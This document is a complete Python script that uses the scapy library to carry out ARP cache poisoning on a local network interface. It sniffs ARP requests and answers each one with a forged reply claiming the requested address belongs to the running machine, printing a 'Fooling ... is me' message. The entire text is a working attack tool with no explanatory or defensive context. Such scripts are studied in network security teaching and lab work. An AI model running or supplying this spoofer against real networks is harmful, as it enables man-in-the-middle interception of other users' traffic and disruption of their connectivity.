#!/usr/bin/python3

import sys
from scapy.all import sendp, ARP, Ether, sniff

if len(sys.argv) < 2:
    print(sys.argv[0] + "<iface>")
    sys.exit(0)

def arp_positon_callback(packet):
    # Got ARP request ?
    if packet[ARP].op == 1:
        answer = Ether(dst=packet[ARP].hwsrc) / ARP()
        answer[ARP].op = "is-at"
        answer[ARP].hwdst = packet[ARP].hwsrc
        answer[ARP].psrc = packet[ARP].pdst
        answer[ARP].pdst = packet[ARP].psrc

        print("Fooling" + packet[ARP].psrc + " that " + \
              packet[ARP].pdst + " is me")
        sendp(answer, iface=sys.argv[1])

sniff(prn=arp_positon_callback,
      filter="arp",
      iface=sys.argv[1],
      store=0)